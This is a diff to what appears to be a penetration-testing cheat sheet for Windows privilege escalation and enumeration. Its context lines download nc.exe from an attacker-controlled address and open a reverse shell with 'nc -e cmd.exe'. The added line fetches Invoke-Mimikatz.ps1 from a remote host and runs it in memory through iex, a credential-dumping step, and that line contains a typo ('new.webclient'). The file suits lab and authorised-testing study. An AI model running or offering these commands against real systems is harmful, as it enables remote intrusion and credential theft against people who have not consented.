@@ -15,6 +15,7 @@ iwr -uri $OUR_IP/nc.exe -outfile nc.exe
 rlwrap -crA nc -lvnp 9002 # On kali box
 .\nc.exe $OUR_IP 9002 -e cmd.exe
 powershell -ep bypass
+iex(new-object new.webclient).downloadstring("$IP/Invoke-Mimikatz.ps1")
 ```
 
 ## Enumeration
@@ -89,6 +90,7 @@ schtasks /query /fo LIST /v > tasks.txt
 dos2unix tasks.txt     # On kali
 less tasks.txt         # On kali, search for tasks owned by privileged accounts. Check "TaskName", "Next Run Time", "Author", "Task To Run", and "Run As User"
 schtasks /query /fo LIST /v /TN "$TASK"
+cat tasks.txt | grep \.exe | grep -iv system32
 ```
 
 ## Automated Tools
